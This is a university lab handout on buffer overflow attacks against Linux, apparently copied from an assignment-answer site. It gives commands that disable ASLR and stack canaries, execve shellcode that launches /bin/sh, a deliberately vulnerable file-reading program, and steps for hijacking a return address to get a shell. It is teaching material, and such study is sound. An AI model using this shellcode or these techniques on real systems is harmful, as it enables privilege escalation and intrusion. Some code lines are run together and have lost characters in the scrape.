Download Link: https://assignmentchef.com/product/solved-cis450-programming-lab-assignment-3-buffer-overflow-lab
<br>
<strong> </strong>Buffer overflow is defined as a condition in which a program attempts to write data beyond the boundaries of preallocated fixed-length buffers. This vulnerability can be utilized by a malicious user to alter the flow of control in a process, or even to execute an arbitrary piece of code. This vulnerability arises due to the closeness of the data buffers and the return address. An overflow can cause the return address to be overwritten. We will conduct the attack on an Intel System running Linux. There are three protection mechanisms in Linux that make buffer overflow attacks much more difficult. First, some Linux variants use an exec-shield to make the stack nonexecutable; therefore, even if we can inject some exploit code onto the stack, it cannot run. Second, Linux supports Address Space Layout Randomization (ASLR) to randomize the starting address of the heap and/or stack. This makes it difficult to guess the exact address of the exploit code; recall that guessing addresses is one of the critical steps of buffer-overflow attacks. If you have root (Super User (su)) access on a Linux system, you can disable this feature by using one of the following commands, (note that you do <strong>NOT</strong> have root access on the lab machines):




<strong>$ sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space </strong>

<strong>$ sudo sysctl -w kernel.randomize_va_space=0 </strong>

<strong> </strong>

— this simply sets the proc file /proc/sys/kernel/randomize_va_space to contain 0 instead of 1 or 2.




Finally, a “canary” (think of miners carrying a canary in the mine to detect gas) can be placed on the stack between the local data and the return address. If this random value is modified, then a stack smashing attempt is detected on return from the function, and the program is halted. This can be set using the –fstack-protector-all flag, and avoided by turning off stack protection when compiling our code:




<strong>$ gcc –fno-stack-protector … </strong>

<strong> </strong>

In the next section, we’ll set about the task of building some exploit code. We won’t do anything too malicious. Also, it worth warning that attempts to actually hack into computer systems is considered unethical, but to prevent such attacks in our own code, it is important to understand how they are created.

<strong> </strong>

<ol>

 <li><strong> Building Some Exploit Code: </strong></li>

</ol>

<strong> </strong>

To further protect against buffer overflow attacks and other attacks that use shell programs, many shell programs automatically drop their privileges when invoked. Therefore, even if you can “fool” a privileged Set-UID program to invoke a shell, you might not be able to retain the privileges within the shell. This protection scheme is implemented in /bin/bash and /bin/dash. In many Linux systems, /bin/sh is actually a symbolic link to /bin/bash or

/bin/dash. Notice the leading “l”(l = symbolic link) when you execute the command: <strong>ls -l /bin/sh</strong>. To circumvent this protection scheme, we could use another shell program (e.g., /bin/zsh), instead of /bin/dash. The following instructions describe how to create some exploit code. All of the initial code is available online in a gzipped, tape archive (tgz) file: <strong>/pub/cis450/programs/Lab3.tgz</strong>. Copy this file to your own directory, and extract the files using the command: <strong>tar xvzf Lab3.tgz</strong>. This will create a folder called Lab3 with all of the necessary files inside that folder; e.g., <strong>cd Lab3</strong>.




<strong>Exploit Code: </strong>Before you start the attack, you need some exploit code; i.e., code that can be used to launch a root shell or perform some other malicious act; e.g., change a password, etc. This exploit code has to be loaded into the memory so that we can force our program to jump to it. Consider the following code that makes a system call to execute /bin/sh:







int main( ) {     char *argv[2];     argv[0] = “/bin/sh”;     argv[1] = NULL;

execve(argv[0], argv, NULL);

}




The shell code we are using is essentially just the assembly version of the above program (just modified to store the strings on the stack). The simple assembly version is called shellCode.c:




<strong>int main() { </strong>

<strong>__asm__( </strong>

<strong>  “mov    $0x0,%rdx
t”        // arg 3 = NULL </strong>

<strong>  “mov    $0x0,%rsi
t”        // arg 2 = NULL </strong>

<strong>  “mov    $0x0068732f6e69622f,%rdi
t” </strong>

<strong>  “push   %rdi
t”             // push “/bin/sh” onto stack </strong>

<strong>  “mov    %rsp,%rdi
t”        // arg 1 = stack pointer = addr of “/bin/sh” </strong>

<strong>  “mov    $0x3b,%rax
t”       // syscall number = 59 </strong>

<strong>  “syscall
t” </strong>

<strong>); </strong>

<strong>} </strong>

This is roughly equivalent to the system call: execve(“/bin/sh”,NULL,NULL);




To build the code, compile the code using: <strong>gcc –o shellCode shellCode.c</strong>, or just type the command: <strong>make shellCode</strong>. Notice, there is a Makefile in the same folder with the sample code, so when you type <strong>make shellCode</strong>, the section labeled shellCode: is executed:




<strong>shellCode: shellCode.c </strong>

<strong>        gcc -o shellCode shellCode.c </strong>




Dependencies are shown on the first line, e.g., shellCode.c – we need the source to build it, and the command executed is shown on the second line (there is a single tab in front of the gcc). Recall that we can dump the executable code to examine its contents using objdump; e.g., <strong>objdump –d shellCode</strong>.

<strong>.. </strong>

<strong>0000000000000660 &lt;main&gt;: </strong>

<strong> 660:   55                      push   %rbp </strong>

<strong> 661:   48 89 e5                mov    %rsp,%rbp </strong>

<strong> 664:   48 c7 c2 00 00 00 00    mov    $0x0,%rdx </strong>

<strong> 66b:   48 c7 c6 00 00 00 00    mov    $0x0,%rsi </strong>

<strong> 672:   48 bf 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdi </strong>

<strong> 679:   73 68 00 </strong>

<strong> 67c:   57                      push   %rdi </strong>

<strong> 67d:   48 89 e7                mov    %rsp,%rdi </strong>

<strong> 680:   48 c7 c0 3b 00 00 00    mov    $0x3b,%rax </strong>

<strong> 687:   0f 05                   syscall </strong>

<strong> 689:   b8 00 00 00 00          mov    $0x0,%eax </strong>

<strong> 68e:   5d                      pop    %rbp </strong>

<strong> 68f:   c3                      retq </strong>




The following program shows you how to launch a shell by loading a character array with the relevant parts of the shell code, and making a function call to the array ;-).




Compile the following code, <strong>callShellCode.c</strong> via: <strong>rm callShell;  gcc –o callShell callShellCode.c  </strong>







<strong>// </strong>

<strong>// callShellCode.c – a program that writes some code to execute a shell, </strong>

<strong>//                   and then jumps to that buffer to execute the shell // </strong>

<strong>#include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; </strong>

<strong>#include &lt;string.h&gt; </strong>

<strong> </strong>

<strong>char code[] = </strong>

<strong>    “x55”                          /* push   %rbp */ </strong>

<strong>    “x48x89xe5”                  /* mov    %rsp,%rbp */ </strong>

<strong>    “x48xc7xc2x00x00x00x00”  /* mov    $0x0,%rdx */ </strong>

<strong>    “x48xc7xc6x00x00x00x00”  /* mov    $0x0,%rsi */ </strong>

<strong>    “x48xbfx2fx62x69x6ex2f”  /* movabs $0x68732f6e69622f,%rdi */ </strong>

<strong>    “x73x68x00” </strong>

<strong>    “x57”                          /* push   %rdi */ </strong>

<strong>    “x48x89xe7”                  /* mov    %rsp,%rdi */ </strong>

<strong>    “x48xc7xc0x3bx00x00x00”  /* mov    $0x3b,%rax */ </strong>

<strong>    “x0fx05”                      /* syscall */ </strong>

<strong>    “x5d”                          /* pop    %rbp */ </strong>

<strong>    “xc3”                          /* retq */ </strong>

<strong>    “x90”                          /* nop */ </strong>

<strong>    “x00”                          /* end of string marker added */ ; </strong>

<strong> </strong>

<strong>int main(int argc, char **argv) </strong>

<strong>{ </strong>

<strong>   ((void(*)( ))code)(); } </strong>




Execute using: <strong>./callShell</strong> : This will result in a <strong>Segmentation fault </strong>because we’re trying to execute code in the data segment. To allow the code to be executed there, compile with the <strong>-z execstack  </strong>flag; e.g.,




<strong>    rm callShell;</strong> <strong>gcc –o callShell –z execstack callShellCode.c </strong>




This can also be completed using the commands: <strong>make clean</strong>, followed by  <strong>make callShell</strong>. To see that a new shell is created, use the process status command to see which processes are currently executing:




viper$ <strong>ps </strong>

PID TTY          TIME CMD

2941  pts/13   00:00:00 bash 27159 pts/13   00:00:00 ps




Execute callShell:




viper$ <strong>./callshell </strong>

<strong> </strong>

Then, check that the new process /bin/sh is running:




$ <strong>ps </strong>

PID TTY          TIME CMD

2941  pts/13   00:00:00 bash

27175 pts/13   00:00:00 sh    ß<strong> new shell created! </strong>27178 pts/13   00:00:00 ps




Finally, exit from the newly created shell:

$ <strong>exit                        </strong>ß<strong> exit from /bin/sh </strong><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6709020e0b14020927110e170215">[email protected]</a>$ <strong>ps </strong>

PID TTY          TIME CMD

2941  pts/13   00:00:00 bash

27191 pts/13   00:00:00 ps




Notice, you should see a different shell prompt and an extra process running on your behalf after invoking the shell. To execute a system call in 32-bit code, int $0x80 is used instead of syscall, but we’ll just focus on the 64-bit version of exploit code for this lab.




<ol start="2">

 <li><strong> Fun With Yoo(), Who(), and Foo(): </strong></li>

</ol>

<strong> </strong>

Consider the following code:

<strong>// </strong>

<strong>// funWithYooWhoFoo.c – fun with function calls </strong>

<strong>// </strong>

<strong>#include &lt;stdio.h&gt; </strong>

<strong>#include &lt;stdlib.h&gt; </strong>

<strong> </strong>

<strong>void foo() { </strong>

<strong>    static int foo_cnt = 0;     foo_cnt++; </strong>

<strong>    printf(“Now inside foo() – count = %d !!
”, foo_cnt); } </strong>

<strong> </strong>

<strong>void who() { </strong>

<strong>    static int who_cnt = 0;     who_cnt++; </strong>

<strong>    printf(“Now inside who() – count = %d !
”, who_cnt); } </strong>

<strong> </strong>

<strong>void yoo() { </strong>

<strong>    void *addr[4]; </strong>

<strong>    printf(“Now inside yoo() !
”);     // you can only modify this section </strong>

<strong>     addr[5] = who;     addr[6] = who;     return; } </strong>

<strong> </strong>

<strong>int main (int argc, char *argv[]) </strong>

<strong>{ void *space[99]; yoo(); </strong>

<strong>printf(“Back in main
”); return 0; </strong>

<strong>} </strong>

<strong> </strong>

For the first part of the assignment, we will simply modify some code to smash the stack by writing beyond the end of an array and thus, overwriting the return address, so that a function call to <strong>yoo()</strong>returns to <strong>who() </strong>, and then <strong>who()</strong>returns to <strong>foo()</strong>on the way back to <strong>main()</strong>. In particular, you want the output to be:




<strong>Now inside yoo() ! </strong>

<strong>Now inside who() – count = 1 ! </strong>

<strong>Now inside foo() – count = 1 !! Back in main </strong>

<strong> </strong>

To accomplish this feat, you need to overflow the array so that the return address is overwritten with the address of bar; e.g., you could just add a few:




<strong>addr[5] = who; addr[6] = who; addr[7] = who; </strong>…

But, that would also overwrite the return address to main, so the output might become:




<strong>Now inside yoo() ! </strong>

<strong>Now inside who() – count = 1 ! </strong>

<strong>Now inside who() – count = 2 ! </strong>

<strong>Segmentation fault –  caused by returning to an invalid address                      at the end of who(). </strong>

<strong> </strong>

Hint: the best approach is to save the <strong>return address to main</strong> on the stack before <strong>overwriting </strong>the return address to main.<strong> Remember that the addresses here are going up, while the stack is growing down, also, shorthand for the address of function who() is just who which equates to &amp;who(). </strong>




<strong>To compile the code remember to turn off stack protection: </strong>

<strong> </strong>

<strong>$ make clean </strong>

<strong>$ </strong><strong>gcc -o fun -m32 -fno-stack-protector funWithYooWhoFoo.c </strong>

<strong>$ ./fun </strong>or

<strong>$ make fun </strong>

<strong>$ ./fun  </strong>

Just leave the modified code in the Lab3 folder, later we will create a gzipped, tar archive to upload to submit the assignment. Once you have it working for a 32-bit stack, then, make it work for a 64-bit stack by modifying funWithYooAndWho64.c, and build the executable using:<strong>  </strong><strong>make fun64</strong>, and execute using: <strong>./fun64.</strong>  Again, just leave the modified code, <strong>funWithYooWhoFoo64.c</strong>, in the Lab3 folder.

<strong> </strong>

<strong>Challenge Problem: </strong>Can you make the program cycle through yoo(), who(), and foo() many times (more than one) by only making changes in yoo() and still eventually return to main? If you choose to work on the challenge, upload the code as funWithYooWhoFooChallenge.c. You can use <strong>make funChallenge</strong>, or just <strong>make, </strong>and execute using: <strong>./funC. </strong>

<strong> </strong>

<ol start="3">

 <li><strong> Vulnerable Program: </strong></li>

</ol>




Consider the following code which contains a buffer overflow vulnerability:

//

// vstack.c – vulnerable stack

// … int load_code(char *filename)

{

fd = open (filename, O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);     printf(“fd = %d
”, fd);

addr=mmap((void *)0x12BEE000, 512, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIV&gt;

<em>..     printf(“Addr: %lu
”, (long unsigned) addr); </em>    close (fd);     return 0;

} int bof(char *filename)

{

char buffer[8];     int i;




bp = buffer;

fp = fopen(filename, “rb”);

/* The following statement has a potential buffer overflow problem */     while (!feof(fp))

fread(bp++, sizeof(char), 1, fp);     fclose(fp);     return 0;

}

int main(int argc, char **argv)

{

switch(argc)

{       case 3:

load_code(argv[2]);         printf(“Loaded code
”);         bof(argv[1]);

printf(“Loaded overflow, so what are we doing back here?
”);         break;       default:         printf(“Usage: vstack &lt;overflow&gt; &lt;exploit&gt;
”);         break;     }     return 0;

}




The above program has a buffer overflow vulnerability. It tries to read all of the bytes in a file &lt;overflow&gt; into an array that can only hold 8 bytes. Buffer overflow will occur if more than 8 bytes are read, but the code won’t complain. Normally, we could use the same buffer overflow to also load the code. But remember, our Linux boxes implement two forms of protection to prevent buffer overflow exploits. Through randomization, the data is loaded onto the stack in different locations each time the code is executed, and code on the stack is not executable. Of course, one way to overcome not knowing exactly where the code is loaded is to insert many NOP (0x90) operations at the beginning of the code, then by guessing a location that hits one of the no-ops, we can “sleigh” into the executable code. But, we still have a bigger problem with the newer versions of Linux, and that is, data on the stack is not executable. Lucky for us, the Linux boxes do not use randomization on fixed memory-mapped regions in the data segment. So, our attack is going to be in two parts. First we will load the exploit shell code into a memory mapped segment. Then, we will adjust the overflow code so that the return address is set to return to the location of the code in that data segment. If we are successful, then the call to <strong>bof( )</strong> should <strong>return</strong> to execute the shell code!




<strong>Exploiting the Vulnerability: </strong>We provide you with some partially completed exploit creation code called <strong>buildExploit.c</strong>. The goal of this code is to construct contents for binary files “overflow” and “exploit”. In this code, the shell code is given to you (as above). You need to develop the rest; e.g., the correct exploit and overflow. After you finish the above program, compile and run it using:  <strong>make buildExploit; ./buildExploit</strong>. This will generate the overflow data and the executable exploit shell code in the files “overflow” and “exploit”, respectively. Then, run the vulnerable program stack. If your exploit is implemented correctly, (and the vulnerable program was running with the setuid bit on — more on this later) you should be able to obtain a “root” shell:




viper$ <strong>gcc -o buildExploit buildExploit.c</strong>

viper$<strong>./buildExploit      — generate binary files overflow and exploit</strong> viper$<strong>./vstack  overflow  exploit</strong>       <strong>— launch the attack </strong>$  ß Bingo! You’ve got a “root” shell!




Of course, it’s not a “real” root shell, unless you are running the program as su = super-user. Once you are able to obtain a shell, then <strong>modify the exploit code to execute the shell script “snow.sh”</strong> with the newly created shell;

e.g., /bin/sh snow.sh. Hint: both “/bin/sh” and “snow.sh” fit within 8 bytes terminated with an end of string marker “ ” which is just 0x00. For this part, you can’t just replace “/bin/sh” with “snow.sh” — even though that will cause the shell script to be executed ;-). Look at the requirements for the arguments to execve. To stop the snow from falling, just type &lt;ctrl&gt;-c to interrupt the script.




<strong>What to Submit: </strong>




Upload a gzipped, tar archive called Lab3.tgz containing the contents of your Lab3 folder. To create an archive, jump up one level from the Lab3 directory; e.g., $ <strong>cd .. </strong>Then just issue the tar command to create the archive:

<strong> </strong>

<strong>$ tar cvzf Lab3.tgz Lab3 </strong>

<strong> </strong>

If you prefer, you can create a zipped file containing the contents of Lab3. Finally, upload your archive file Lab3.tgz or Lab3.zip to K-State OnLine.




<strong>References: </strong>[1] Aleph One.    “Smashing The Stack For Fun And Profit”. <em>Phrack 49</em>, Volume 7, Issue 49.